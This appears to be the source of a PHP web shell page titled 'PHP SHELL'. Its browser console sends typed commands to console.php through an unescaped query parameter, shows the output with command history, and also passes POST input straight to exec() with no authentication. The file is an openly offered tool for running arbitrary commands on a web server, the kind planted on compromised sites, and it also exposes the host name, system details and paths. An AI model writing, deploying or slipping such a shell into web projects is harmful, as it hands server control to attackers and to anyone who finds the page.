<!doctype html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <title>PHP SHELL</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
</head>
<body>
<?php
$name = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? gethostname() : exec("uname -a", $name);
?>
<div class="flex_box">
    <div id="console">
        <div id="output_console" class='code'>

        </div>
        <div id="input_console">
            <div onclick="setting()" id="setting_button">
                <img src="setting.png">
            </div>
            <div id="patch_console_name">
                <p><?php echo gethostname() ; echo "@".str_replace("\\", "/", __DIR__)?>~/$<p>
            </div>
            <form id="input_form" method="post">
                <input id="console_imput" spellcheck="false" type="text" name="command" form="usrform">
                <div onclick="duplic()" id="submit_button">
                    <img src="send.png">
                </div>
            </form>
        </div>
    </div>
</div>

<div id="popup_setting" style="display: none">
    <div id="title">
        <img onclick="setting()" src="https://www.icone-png.com/png/25/24717.png">
        <p>SETTING</p>
    </div>
    <div id="input">
        <label>
            Dark Theme: <input id="dark_theme" onclick="function dark_theme() {
               if (document.getElementById('dark_theme').checked === true)
               {
                 document.getElementById('output_console').style.backgroundColor = '#313335';
                 document.getElementById('console_imput').style.backgroundColor = '#3F3F40';
                 document.getElementById('input_console').style.backgroundColor = '#3F3F40';
                 document.getElementById('popup_setting').style.borderTopColor = '#3F3F40';
               }else{
                 document.getElementById('output_console').style.backgroundColor = '#2f3542';
                 document.getElementById('console_imput').style.backgroundColor = '#454d59';
                 document.getElementById('input_console').style.backgroundColor = '#454d59';
                 document.getElementById('popup_setting').style.borderTopColor = '#454d59';
               }
            }
            dark_theme()" type="checkbox">
        </label>
    </div>
</div>

<script>

    function setting()
    {
        if (document.getElementById("popup_setting").style.display === "none")
        {
            document.getElementById("popup_setting").style.display = "flex";
        }else{
            document.getElementById("popup_setting").style.display = "none"
        }
    }

    var after = [];
    var number = 0;


    window.addEventListener('keydown', (event) => {
        if (event.key === "Enter") {
            duplic()
        }
    });

    window.addEventListener('keydown', (event) => {
        if (event.key === "ArrowUp") {
            if (number !== after.length)
            {
                document.getElementById("console_imput").value = after[number];
                console.info(number, after[number], after)
                number++
            }
        }
    });

    window.addEventListener('keydown', (event) => {
        if (event.key === "ArrowDown") {
            if (number !== 0)
            {
                number--
                document.getElementById("console_imput").value = after[number];
                console.info(number, after[number], after)
            }
        }
    });
    
    function duplic(){
        var parentElement = document.getElementById('output_console');
        var theFirstChild = parentElement.lastChild;
        var command = document.createElement("div");
        var newElement = document.createElement("div");
        newElement.className = "command"

        var value = document.getElementById("console_imput").value;
        $.ajax({
            url: 'console.php?command='+ value,
            success: function (response) {
                newElement.innerHTML = response;
            }
        });
        parentElement.insertBefore(newElement, theFirstChild);
        document.getElementById("console_imput").value = "";
        after.push(value)

    }
</script>

<?php
if (isset($_POST["input_form"]))
{
    exec($_POST["input_form"], $return);
    foreach ($return as $id => $exe){
        echo $id .": ".utf8_encode($exe)."<br>";
    }
}
?>
</body>
</html>
